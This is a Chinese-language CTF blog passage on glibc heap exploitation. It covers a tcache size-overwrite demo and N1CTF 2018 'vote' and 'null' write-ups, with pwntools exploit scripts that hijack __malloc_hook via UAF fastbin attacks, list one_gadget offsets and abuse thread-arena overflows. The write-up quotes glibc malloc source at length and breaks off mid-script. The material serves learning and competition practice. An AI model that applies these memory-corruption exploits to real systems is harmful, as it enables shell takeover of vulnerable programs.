堆溢出不完全应用于堆溢出，当内存块释放前，size位置被修改为任意包含在tcache范围内时，在释放后都可以被放置在tcache相应位置。 12345678910111213141516171819202122232425262728293031323334 #include &lt;malloc.h&gt; #include &lt;stddef.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;stdint.h&gt;typedef struct tcache_entry &#123; struct tcache_entry *next; &#125; tcache_entry; size_t *chunksizep(void *mem) &#123; return (size_t *)(((char *)mem) - sizeof(size_t)); &#125; int main(int argc, const char* argv[]) &#123; size_t *a = malloc(0x48); size_t *b = malloc(0x48); size_t *c = malloc(0x48); printf("first , we malloc 3 chunks,1: %p,2: %p,3: %p\n",a,b,c); void (* ptr)(char *) ; *c = puts; printf("overflow....\n"); memset(a, 'a', 0x48+1); printf("free middle of the three\n "); free(b); size_t * d = malloc(0x58); printf("then malloc a bigger chunk:%p\n ",d); d[0x58/sizeof(size_t)-1] = system; printf("%p,%p",c,&amp;d[0x58/sizeof(size_t)-1]); ptr = *c; (*ptr)("/bin/sh"); return 0; &#125; unlink此外，对于small bin大小的堆块，在smallbin中包含有空闲块的时候，会同时将同大小的其他空闲块，放入tcache中，此时也会出现解链操作，但相比于unlink宏，缺少了链完整性校验。因此，原本unlink操作在该条件下也可以使用。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks over. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin) &#123; if (tc_victim != 0) &#123; bck = tc_victim-&gt;bk; set_inuse_bit_at_offset (tc_victim, nb); if (av != &amp;main_arena) set_non_main_arena (tc_victim); bin-&gt;bk = bck; bck-&gt;fd = bin; tcache_put (tc_victim, tc_idx); &#125; &#125; &#125;#endif#define unlink(AV, P, BK, FD) &#123; \ if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \ malloc_printerr (check_action, "corrupted size vs. prev_size", P, AV); \ FD = P-&gt;fd; \ BK = P-&gt;bk; \ if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \ malloc_printerr (check_action, "corrupted double-linked list", P, AV); \ else &#123; \ FD-&gt;bk = BK; \ BK-&gt;fd = FD; \ if (!in_smallbin_range (chunksize_nomask (P)) \ &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123; \ if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) \ || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0)) \ malloc_printerr (check_action, \ "corrupted double-linked list (not small)", \ P, AV); \ if (FD-&gt;fd_nextsize == NULL) &#123; \ if (P-&gt;fd_nextsize == P) \ FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; \ else &#123; \ FD-&gt;fd_nextsize = P-&gt;fd_nextsize; \ FD-&gt;bk_nextsize = P-&gt;bk_nextsize; \ P-&gt;fd_nextsize-&gt;bk_nextsize = FD; \ P-&gt;bk_nextsize-&gt;fd_nextsize = FD; \ &#125; \ &#125; else &#123; \ P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; \ P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; \ &#125; \ &#125; \ &#125; \&#125; 首先，在tcache满的时候释放几个堆块到small bin中，再将原本的堆块malloc回去，使得tcache为空。再次malloc时，会从smallbin中分配，此时会把刚释放的同等大小堆块移入tcache中，此时会出现unlink。 Referencehttp://tukan.farm/2017/07/08/tcache/ http://ftp.gnu.org/gnu/glibc/ 34C3 CTF —— SimpleGC]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[N1CTF 2018 && 线程堆知识源代码分析]]></title>
    <url>%2F2018%2F03%2F15%2Fn1ctf2018%2F</url>
    <content type="text"><![CDATA[Nu1L队组织的一场国际赛，涉及的知识面很广，仅记录PWN题的第一道和第二道。 vote一道比较常规套路的fastbin利用方法，主要涉及的知识是fastbin堆块的劫持。 题目分析题目是一个投票系统，主要包括5个函数： 涉及的数据结构是投票者的票数和名字： 12340 8 16 ...+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| number | time | name ......... | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 这里的投票函数实现的很诡异，创建了一个新的线程，线程利用一个bss段上的变量传递线程参数，sleep 等待3s开始投票，出现一个问题，当在3s内有另外的投票时，会造成竞争条件，使第一人的票数投到第二人上。 说到诡异，这个取消函数就更诡异了，显然里面有一个UAF以及double free漏洞： 漏洞利用地址泄露利用UAF漏洞，首先申请一个超过global_max_fast的漏洞，这样在释放时，堆块会放到unsorted bin中，在unsorted bin的组织结构中，堆块的fd、bk指针会填充为main_arena+88这个地址，因而泄露了libc的地址。注意防止释放时被top块合并就好了。 Fastbin劫持同样还是利用UAF漏洞，fastbin是一个单链表结构，当可以控制一个堆块的fd指针的时候基本就可以实现任意地址分配。 首先，分配两个大小为0x70 的堆块，并且顺序释放，这样在fastbin中会形成单链表结构，单链表的第二块指向第一块的堆头。 这里的一个比较新的点是，这题的数据结构无法直接修改fd指针，但是由于UAF漏洞，当对一个已释放用户投票时，仍然修改了堆块的fd指针，理论上可以指向任意位置。 这里我选择将fd指针指向原位置+0x20的地址，因为这个地方可以编辑（上一个用户的name字段），因而伪造一个堆块，就可以再将fastbin劫持到其他地方，选择将堆块劫持到 __malloc_hook - 0x23的位置，这个位置是非页对齐的，但是在分配地址时并不检测，而且在libc 2.23库中，此处存在多个libc地址，当非页对齐看时，此处就有一个0x7f，恰好可绕过fastbin的size检测，另外还有一个malloc_assert检测，非常恰巧的一个值。 当可以控制__malloc_hook，将其覆盖为one_gadget，就可以直接通过malloc新的堆块来得到shell了。 解题脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283from pwn import *import time,base64debug=0elf = ELF('./vote')if debug: p= process('./vote') context.log_level = 'debug' libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') #gdb.attach(p)#,'b*0x0400F6D'else: p = remote('47.90.103.10',6000)#process('./pwn1') libc = ELF('./libc-2.23.so')def add(size,name): p.recvuntil('Action:') p.sendline('0') p.recvuntil('size') p.sendline(str(size)) p.recvuntil('name:') p.sendline(name)def show(index): p.recvuntil('Action:') p.sendline('1') p.recvuntil('index') p.sendline(str(index))def vote(index): p.recvuntil('Action:') p.sendline('2') p.recvuntil('index') p.sendline(str(index)) def cancel(index): p.recvuntil('Action:') p.sendline('4') p.recvuntil('index') p.sendline(str(index)) add(0x3e0,'p4nda') #0add(555,'p4nda') #1cancel(0)show(0)p.recvuntil('count: ')leak = int(p.recvline()[:-1])libc.address = leak - 88 - 0x10 - libc.symbols['__malloc_hook']print '[+] ', hex(leak)print '[+] system :',hex(libc.symbols['system'])add(0x50,p64(0x71)+p64(0x71)+p64(libc.symbols['__malloc_hook']-0x23) )#2add(0x50,'p4nda' )#3#add(555,'p4nda') #4cancel(2)cancel(3)for i in range(32): vote(3)add(0x50,'p4nda' )#5add(0x50,'p4nda' )#6add(0x50,'p4n'+p64(libc.address + 0xf0274))#0xf02a4))#6p.recvuntil('Action:')p.sendline('0')p.recvuntil('size')p.sendline(str(0x50))p.interactive()'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf0274 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1117 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL''' null涉及到线程堆块的分配，看了两天源代码，尽管出题人说是 a relatively easy task 。 还是记录一下线程堆块分配的姿势。 线程堆块分配名词解释分配区 个人理解分配区是分配内存必要的分配结构，分为主分配区和非主分配区，主分配区利用sbrk等函数分配，地址是连续的；非主分配区是不连续的，因此需要组织多个子堆块（sub-heap），对应到下面的数据结构，每一个分配区对应一个malloc_state，每一个子堆块对应一个_heap_info。分配区的数量是一定的，与操作系统位数和CPU核数有关 1234For 32 bit systems: Number of arena = 2 * number of cores + 1.For 64 bit systems: Number of arena = 8 * number of cores + 1. 锁 锁是一个普通的变量，需要使用特殊的函数加锁解锁，为了进程间进行同步，防止发生竞争条件。 数据结构 _heap_info 仅存在于线程堆块里的数据结构，主要是标记当前sub_heap的数据信息，在线程里可以存在多个。 主要原因是 ：一个程序（进程）中可以包含多个进程，而各个进程的地址空间是共享的，主要就造成了其地址冲突。当主线程要求使用sbrk函数来保证堆空间是连续的时，那子线程智能使用mmap来分配堆空间。这样一来，由于mmap分配的特点，导致了线程分配的堆块是以块为单位的，如果某线程需要的堆块多的话，进程空间是不足的，再次使用mmap来分配heap时，二者并不连续，所以需要这样的数据结构来标识该块的所属和一些内存信息。 该sub_heap数据结构是单链表形式保存的，其_heap_info保存了前一个sub_heap的位置。 123456789101112typedef struct _heap_info&#123; mstate ar_ptr; /* Arena for this heap. */ struct _heap_info *prev; /* Previous heap. */ size_t size; /* Current size in bytes. */ size_t mprotect_size; /* Size in bytes that has been mprotected PROT_READ|PROT_WRITE. */ /* Make sure the following data is properly aligned, particularly that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of MALLOC_ALIGNMENT. */ char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK];&#125; heap_info; malloc_state 对于进程堆有一些了解的同学对这个数据结构会很熟悉，一个非常常见的结构体是保存在libc库bss段的main_arena，这是主线程堆是唯一的，所以为了方便，在libc中加入了一个全局变量，而这个数据结构的目的是为了组织堆空间，如fastbin、unsorted bin、top链表的组织等等。 每一个线程有唯一 的malloc_state数据结构，即thread arena。 123456789101112131415161718192021222324252627282930313233struct malloc_state&#123; /* Serialize access. */ mutex_t mutex; /* Flags (formerly in max_fast). */ int flags; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. */ struct malloc_state *next_free; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;&#125;; 结构组织 分配区的获取 可以先从malloc的代码出发，一步一步寻找分配区的生成与线程获取。首先是__libc_malloc函数 12345678910111213141516171819202122232425262728293031void *__libc_malloc (size_t bytes)&#123; mstate ar_ptr; void *victim; void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) return (*hook)(bytes, RETURN_ADDRESS (0)); arena_get (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); /* Retry with another arena only if we were able to find a usable arena before. */ if (!victim &amp;&amp; ar_ptr != NULL) &#123; LIBC_PROBE (memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); &#125; if (ar_ptr != NULL) (void) mutex_unlock (&amp;ar_ptr-&gt;mutex); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || ar_ptr == arena_for_chunk (mem2chunk (victim))); return victim;&#125;libc_hidden_def (__libc_malloc) malloc函数可以大致分为四部分，首先是__malloc_hook函数的检测与执行；接下来是arena_get，也就是分配区的获取；然后是_int_malloc，这个是堆块分配的主要逻辑，也是我们比较熟悉的如fastbin、unsorted bin的组织流程，它的返回值就是拟分配的堆块；最后是对拟分配堆块的一些检测。 跟踪一下arena_get函数，这是一个宏定义函数，其中，thread_arena变量是线程的全局变量，标志着最近使用过的分配区结构 1234#define arena_get(ptr, size) do &#123; \ ptr = thread_arena; \ arena_lock (ptr, size); \ &#125; while (0) 继续跟踪arena_lock函数，这也是一个宏定义函数。首先，当线程曾经拥有过分配区，会尝试对该分配区加速并使用，否则执行arena_get2函数。 123456#define arena_lock(ptr, size) do &#123; \ if (ptr &amp;&amp; !arena_is_corrupt (ptr)) \ (void) mutex_lock (&amp;ptr-&gt;mutex); \ else \ ptr = arena_get2 ((size), NULL); \ &#125; while (0) 由于我们要寻找该分配区的初始化，所以继续跟踪arena_get2： 首先，arena_get2函数调用了get_free_list()函数，猜测应该返回一个空或者一个分配区，如果成功返回了一个分配区，就直接结束；当未找到可用的分配区，就进入下面的逻辑：首先查看narenas_limit变量，应该是对于分配区个数的限制，当未初始化时，会根据内核数量及mp_areana_max进行计算。 narenas是当前分配区的个数，当不超过分配区个数时，会调用_int_new_arena生成新的分配区，否则调用reused_arena来等待服用分配区。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748arena_get2 (size_t size, mstate avoid_arena)&#123; mstate a; static size_t narenas_limit; a = get_free_list (); if (a == NULL) &#123; /* Nothing immediately available, so generate a new arena. */ if (narenas_limit == 0) &#123; if (mp_.arena_max != 0) narenas_limit = mp_.arena_max; else if (narenas &gt; mp_.arena_test) &#123; int n = __get_nprocs (); if (n &gt;= 1) narenas_limit = NARENAS_FROM_NCORES (n); else /* We have no information about the system. Assume two cores. */ narenas_limit = NARENAS_FROM_NCORES (2); &#125; &#125; repeat:; size_t n = narenas; /* NB: the following depends on the fact that (size_t)0 - 1 is a very large number and that the underflow is OK. If arena_max is set the value of arena_test is irrelevant. If arena_test is set but narenas is not yet larger or equal to arena_test narenas_limit is 0. There is no possibility for narenas to be too big for the test to always fail since there is not enough address space to create that many arenas. */ if (__glibc_unlikely (n &lt;= narenas_limit - 1)) &#123; if (catomic_compare_and_exchange_bool_acq (&amp;narenas, n + 1, n)) goto repeat; a = _int_new_arena (size); if (__glibc_unlikely (a == NULL)) catomic_decrement (&amp;narenas); &#125; else a = reused_arena (avoid_arena); &#125; return a;&#125; 先跟踪get_free_list函数，free_list也是一个全局变量，用于标识下一个可用的分配区，逻辑十分简单，当获取到的free_list不为空，就替换了当前线程保存的分配区，并对该分配区加锁，否则返回NULL。 123456789101112131415161718192021222324252627282930static mstateget_free_list (void)&#123; mstate replaced_arena = thread_arena; mstate result = free_list; if (result != NULL) &#123; (void) mutex_lock (&amp;free_list_lock); result = free_list; if (result != NULL) &#123; free_list = result-&gt;next_free; /* The arena will be attached to this thread. */ ++result-&gt;attached_threads; detach_arena (replaced_arena); &#125; (void) mutex_unlock (&amp;free_list_lock); if (result != NULL) &#123; LIBC_PROBE (memory_arena_reuse_free_list, 1, result); (void) mutex_lock (&amp;result-&gt;mutex); thread_arena = result; &#125; &#125; return result;&#125; 再跟踪reused_arena，可以看到，程序维护了一个全局变量next_to_use，该变量初始值是&amp;main_arena，当成功获取了一个分配区后，这个变量会指向下一个分配区，也就是说分配区的使用是平均和循环的，这也避免了一个分配区被重复使用多次。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263static mstatereused_arena (mstate avoid_arena)&#123; mstate result; /* FIXME: Access to next_to_use suffers from data races. */ static mstate next_to_use; if (next_to_use == NULL) next_to_use = &amp;main_arena; /* Iterate over all arenas (including those linked from free_list). */ result = next_to_use; do &#123; if (!arena_is_corrupt (result) &amp;&amp; !mutex_trylock (&amp;result-&gt;mutex)) goto out; /* FIXME: This is a data race, see _int_new_arena. */ result = result-&gt;next; &#125; while (result != next_to_use); /* Avoid AVOID_ARENA as we have already failed to allocate memory in that arena and it is currently locked. */ if (result == avoid_arena) result = result-&gt;next; /* Make sure that the arena we get is not corrupted. */ mstate begin = result; while (arena_is_corrupt (result) || result == avoid_arena) &#123; result = result-&gt;next; if (result == begin) break; &#125; /* We could not find any arena that was either not corrupted or not the one we wanted to avoid. */ if (result == begin || result == avoid_arena) return NULL; /* No arena available without contention. Wait for the next in line. */ LIBC_PROBE (memory_arena_reuse_wait, 3, &amp;result-&gt;mutex, result, avoid_arena); (void) mutex_lock (&amp;result-&gt;mutex);out: /* Attach the arena to the current thread. Note that we may have selected an arena which was on free_list. */ &#123; /* Update the arena thread attachment counters. */ mstate replaced_arena = thread_arena; (void) mutex_lock (&amp;free_list_lock); detach_arena (replaced_arena); ++result-&gt;attached_threads; (void) mutex_unlock (&amp;free_list_lock); &#125; LIBC_PROBE (memory_arena_reuse, 2, result, avoid_arena); thread_arena = result; next_to_use = result-&gt;next; return result;&#125; 最后，分析一下一个新分配区的生成函数_int_new_arena。首先调用了new_heap函数来申请新的内存，可以看到，当获得内存后，该内存的第一块是heap_info结构，接下来设置了malloc_state结构和top头。 至此，一个新的分配区生成完毕。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768static mstate_int_new_arena (size_t size)&#123; mstate a; heap_info *h; char *ptr; unsigned long misalign; h = new_heap (size + (sizeof (*h) + sizeof (*a) + MALLOC_ALIGNMENT), mp_.top_pad); if (!h) &#123; /* Maybe size is too large to fit in a single heap. So, just try to create a minimally-sized arena and let _int_malloc() attempt to deal with the large request via mmap_chunk(). */ h = new_heap (sizeof (*h) + sizeof (*a) + MALLOC_ALIGNMENT, mp_.top_pad); if (!h) return 0; &#125; a = h-&gt;ar_ptr = (mstate) (h + 1); malloc_init_state (a); a-&gt;attached_threads = 1; /*a-&gt;next = NULL;*/ a-&gt;system_mem = a-&gt;max_system_mem = h-&gt;size; arena_mem += h-&gt;size; /* Set up the top chunk, with proper alignment. */ ptr = (char *) (a + 1); misalign = (unsigned long) chunk2mem (ptr) &amp; MALLOC_ALIGN_MASK; if (misalign &gt; 0) ptr += MALLOC_ALIGNMENT - misalign; top (a) = (mchunkptr) ptr; set_head (top (a), (((char *) h + h-&gt;size) - ptr) | PREV_INUSE); LIBC_PROBE (memory_arena_new, 2, a, size); mstate replaced_arena = thread_arena; thread_arena = a; mutex_init (&amp;a-&gt;mutex); (void) mutex_lock (&amp;list_lock); /* Add the new arena to the global list. */ a-&gt;next = main_arena.next; /* FIXME: The barrier is an attempt to synchronize with read access in reused_arena, which does not acquire list_lock while traversing the list. */ atomic_write_barrier (); main_arena.next = a; (void) mutex_unlock (&amp;list_lock); (void) mutex_lock (&amp;free_list_lock); detach_arena (replaced_arena); (void) mutex_unlock (&amp;free_list_lock); /* Lock this arena. NB: Another thread may have been attached to this arena because the arena is now accessible from the main_arena.next list and could have been picked by reused_arena. This can only happen for the last arena created (before the arena limit is reached). At this point, some arena has to be attached to two threads. We could acquire the arena lock before list_lock to make it less likely that reused_arena picks this new arena, but this could result in a deadlock with ptmalloc_lock_all. */ (void) mutex_lock (&amp;a-&gt;mutex); return a;&#125; 最后再追踪一下new_heap这个申请内存的函数。全局变量 aligned_heap_area 是上一次调用 mmap 分配内存的结束虚拟地址，并已经按照 HEAP_MAX_SIZE 大小对齐。如果 aligned_heap_area 不为空，尝试从上次映射结束地址开始映射大小为 HEAP_MAX_SIZE 的内存块， 由于全局变量 aligned_heap_area 没有锁保护，可能存在多个线程同时 mmap()函数从 aligned_heap_area 开始映射新的虚拟内存块，操作系统会保证只会有一个线程会成功，其它在同一地址映射新虚拟内存块都会失败。 无论映射是否成功，都将全局变量 aligned_heap_area 设置为 NULL。如果映射成功，但返回的虚拟地址不是按HEAP_MAX_SIZE 大小对齐的，取消该区域的映射，映射失败。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475static heap_info *internal_functionnew_heap (size_t size, size_t top_pad)&#123; size_t pagesize = GLRO (dl_pagesize); char *p1, *p2; unsigned long ul; heap_info *h; if (size + top_pad &lt; HEAP_MIN_SIZE) size = HEAP_MIN_SIZE; else if (size + top_pad &lt;= HEAP_MAX_SIZE) size += top_pad; else if (size &gt; HEAP_MAX_SIZE) return 0; else size = HEAP_MAX_SIZE; size = ALIGN_UP (size, pagesize); /* A memory region aligned to a multiple of HEAP_MAX_SIZE is needed. No swap space needs to be reserved for the following large mapping (on Linux, this is the case for all non-writable mappings anyway). */ p2 = MAP_FAILED; if (aligned_heap_area) &#123; p2 = (char *) MMAP (aligned_heap_area, HEAP_MAX_SIZE, PROT_NONE, MAP_NORESERVE); aligned_heap_area = NULL; if (p2 != MAP_FAILED &amp;&amp; ((unsigned long) p2 &amp; (HEAP_MAX_SIZE - 1))) &#123; __munmap (p2, HEAP_MAX_SIZE); p2 = MAP_FAILED; &#125; &#125; if (p2 == MAP_FAILED) &#123; p1 = (char *) MMAP (0, HEAP_MAX_SIZE &lt;&lt; 1, PROT_NONE, MAP_NORESERVE); if (p1 != MAP_FAILED) &#123; p2 = (char *) (((unsigned long) p1 + (HEAP_MAX_SIZE - 1)) &amp; ~(HEAP_MAX_SIZE - 1)); ul = p2 - p1; if (ul) __munmap (p1, ul); else aligned_heap_area = p2 + HEAP_MAX_SIZE; __munmap (p2 + HEAP_MAX_SIZE, HEAP_MAX_SIZE - ul); &#125; else &#123; /* Try to take the chance that an allocation of only HEAP_MAX_SIZE is already aligned. */ p2 = (char *) MMAP (0, HEAP_MAX_SIZE, PROT_NONE, MAP_NORESERVE); if (p2 == MAP_FAILED) return 0; if ((unsigned long) p2 &amp; (HEAP_MAX_SIZE - 1)) &#123; __munmap (p2, HEAP_MAX_SIZE); return 0; &#125; &#125; &#125; if (__mprotect (p2, size, PROT_READ | PROT_WRITE) != 0) &#123; __munmap (p2, HEAP_MAX_SIZE); return 0; &#125; h = (heap_info *) p2; h-&gt;size = size; h-&gt;mprotect_size = size; LIBC_PROBE (memory_heap_new, 2, h, h-&gt;size); return h;&#125; 分配区的补充 在malloc获取较大内存空间，导致top用尽时，根据需求会扩大top块的容量。而对于非主分配区，扩大top在一定情况下是获得连续内存的，这就显示出了sub_heap的用途。跟踪一下int_malloc函数，在malloc函数的最后，有这样的代码，当申请的内存，top头无法满足时，会对fastbin进行释放操作，当仍无法满足时，会调用sysmalloc进行补充。 123456789101112131415161718192021222324252627282930313233343536373839 ... if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) &#123; remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); av-&gt;top = remainder; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; /* When we are using atomic ops to free fast chunks we can get here for all block sizes. */ else if (have_fastchunks (av)) &#123; malloc_consolidate (av); /* restore original bin index */ if (in_smallbin_range (nb)) idx = smallbin_index (nb); else idx = largebin_index (nb); &#125; /* Otherwise, relay to handle system-dependent cases */ else &#123; void *p = sysmalloc (nb, av); if (p != NULL) alloc_perturb (p, bytes); return p; &#125;... 追踪sysmalloc代码，代码过长，截取非主分配区部分。当申请的堆小于mmap直接分配阈值，并且分配区是非主分配区时，首先尝试延长原有的heap长度（连续分配）；当长度不满足需求时，会重新分配一块sub_heap，并设置heap_info值，也就是利用mmap随机在内存中申请一块内存，这块内存位于刚刚分配的低地址位置。 123456789101112131415161718192021static void *sysmalloc (INTERNAL_SIZE_T nb, mstate av)&#123; mchunkptr old_top; /* incoming value of av-&gt;top */ INTERNAL_SIZE_T old_size; /* its size */ char *old_end; /* its end address */ long size; /* arg to first MORECORE or mmap call */ char *brk; /* return value from MORECORE */ long correction; /* arg to 2nd MORECORE call */ char *snd_brk; /* 2nd return val */ INTERNAL_SIZE_T front_misalign; /* unusable bytes at front of new space */ INTERNAL_SIZE_T end_misalign; /* partial page left at end of new space */ char *aligned_brk; /* aligned offset into brk */ mchunkptr p; /* the allocated/returned chunk */ mchunkptr remainder; /* remainder from allocation */ unsigned long remainder_size; /* its size */ size_t pagesize = GLRO (dl_pagesize); bool tried_mmap = false; /* If have mmap, and the request size meets the mmap threshold, and the system supports mmap, and there are few enough currently allocated mmapped regions, try to directly map this request rather than expanding top. */ if (av == NULL || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))) { ... } if (av != &amp;main_arena) { heap_info *old_heap, *heap; size_t old_heap_size; /* First try to extend the current heap. */ old_heap = heap_for_ptr (old_top); old_heap_size = old_heap-&gt;size; if ((long) (MINSIZE + nb - old_size) &gt; 0 &amp;&amp; grow_heap (old_heap, MINSIZE + nb - old_size) == 0) { av-&gt;system_mem += old_heap-&gt;size - old_heap_size; arena_mem += old_heap-&gt;size - old_heap_size; set_head (old_top, (((char *) old_heap + old_heap-&gt;size) - (char *) old_top) | PREV_INUSE); } else if ((heap = new_heap (nb + (MINSIZE + sizeof (*heap)), mp_.top_pad))) { /* Use a newly allocated heap. */ heap-&gt;ar_ptr = av; heap-&gt;prev = old_heap; av-&gt;system_mem += heap-&gt;size; arena_mem += heap-&gt;size; /* Set up the new top. */ top (av) = chunk_at_offset (heap, sizeof (*heap)); set_head (top (av), (heap-&gt;size - sizeof (*heap)) | PREV_INUSE); /* Setup fencepost and free the old top chunk with a multiple of MALLOC_ALIGNMENT in size. */ /* The fencepost takes at least MINSIZE bytes, because it might become the top chunk again later. Note that a footer is set up, too, although the chunk is marked in use. */ old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK; set_head (chunk_at_offset (old_top, old_size + 2 * SIZE_SZ), 0 | PREV_INUSE); if (old_size &gt;= MINSIZE) { set_head (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ) | PREV_INUSE); set_foot (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ)); set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA); _int_free (av, old_top, 1); } else { set_head (old_top, (old_size + 2 * SIZE_SZ) | PREV_INUSE); set_foot (old_top, (old_size + 2 * SIZE_SZ)); } } else if (!tried_mmap) /* We can at least try to use to mmap memory. */ goto try_mmap; } else /* av == main_arena */ { ... } } 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139 至此，线程堆的初始化、扩展、sub_heap生成全部完成。 ​ ## 题目分析 题目逻辑很简单，主函数什么都没有，只开启了一个线程。 ![](/img/n1ctf2018/2-1.png) 在线程中，实现了用户输入任意大小的堆块、个数进行填充，并且可以对最后一个堆块赋值。 ![](/img/n1ctf2018/2-3.png) ![](/img/n1ctf2018/2-2.png) ## 漏洞利用 漏洞存在于赋值函数中，是一个堆溢出函数，可以溢出和堆块大小等长的堆块。 ![](/img/n1ctf2018/2-4.png) 该程序不存在地址泄露，并且system的地址也已经给出。 利用方法是利用上述线程堆块分配的知识。 1. 首先将线程第一次分配的非主分配区填充满 2. 再次申请时，线程只能申请一个新的sub_heap，此时的sub_heap地址位于第一次申请的sub_heap低地址位置。 3. 再次将该sub_heap填充满，在最后一次填充时进行复制，由于存在堆溢出，则可以溢出覆盖非主分配区的malloc_state结构体（thread arena），此时的利用和覆盖了main_arena的利用方法一致。 4. 选择fastbin attack的方法进行攻击，将fastbin劫持到bss段上去，因为bss段上有一个函数指针，会在赋值后调用，将这个函数赋值为system，并将堆块起始覆盖为&apos;/bin/sh&apos;即可获得shell。 **hint：** 1. 一定要劫持大小为0x70的fastbin链，因为可以利用bss段起始位置的STDIO file指针。 ，与第一题的利用相同，都是0x7f。 2. 无法劫持top值达到任意分配，原因是无法过int_malloc最后的检测，感兴趣的同学可以踩踩这个坑。 ​ ## 解题脚本 ```pythonfrom pwn import *import timedebug = 1elf = ELF(&apos;./null&apos;)if debug: p = process(&apos;./null&apos;) libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;) context.log_level = &apos;debug&apos;else: exit(0)p.recvuntil(&apos;Enter secret password:&apos;)p.send(&apos;i\&apos;m ready for challenge\n&apos;)time.sleep(3) for i in range(0,3): p.recvuntil(&apos;Action:&apos;) p.sendline(&apos;1&apos;) p.recvuntil(&apos;Size:&apos;) p.sendline(str(0x4000)) p.recvuntil(&apos;blocks:&apos;) p.sendline(str(1000-1)) p.recvuntil(&apos;(0/1):&apos;) p.sendline(&apos;0&apos;) p.recvuntil(&apos;Action:&apos;) p.sendline(&apos;1&apos;) p.recvuntil(&apos;Size:&apos;) p.sendline(str(0x4000)) p.recvuntil(&apos;blocks:&apos;) p.sendline(str(1000-1)) p.recvuntil(&apos;(0/1):&apos;) p.sendline(&apos;0&apos;) p.recvuntil(&apos;Action:&apos;) p.sendline(&apos;1&apos;) p.recvuntil(&apos;Size:&apos;) p.sendline(str(0x4000)) p.recvuntil(&apos;blocks:&apos;) p.sendline(str(1000)) p.recvuntil(&apos;(0/1):&apos;) p.sendline(&apos;0&apos;) p.recvuntil(&apos;Action:&apos;) p.sendline(&apos;1&apos;) p.recvuntil(&apos;Size:&apos;) p.sendline(str(0x4000)) p.recvuntil(&apos;blocks:&apos;) p.sendline(str(1000-1)) p.recvuntil(&apos;(0/1):&apos;) p.sendline(&apos;0&apos;) p.recvuntil(&apos;Action:&apos;) p.sendline(&apos;1&apos;) p.recvuntil(&apos;Size:&apos;) p.sendline(str(0x4000)) p.recvuntil(&apos;blocks:&apos;) p.sendline(str(90-1)) p.recvuntil(&apos;(0/1):&apos;) 